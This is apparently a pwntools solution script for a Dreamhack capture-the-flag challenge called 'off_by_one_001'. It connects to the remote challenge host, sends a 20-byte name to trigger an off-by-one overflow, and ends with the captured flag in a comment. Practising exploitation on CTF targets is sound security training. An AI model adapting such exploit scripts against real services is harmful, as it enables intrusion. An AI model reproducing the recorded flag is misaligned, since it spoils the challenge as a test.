#!/usr/bin/env python3

from pwn import *

HOST = "host3.dreamhack.games"
PORT = 24233

context.binary = elf = ELF('./off_by_one_001', checksec = False)
# libc = ELF('', checksec = False)

# p = process(elf.path)
p = remote(HOST, PORT)

p.sendafter(b'Name: ', b'x'*20)

p.interactive()
# DH{343bab3ef81db6f26ee5f1362942cd79}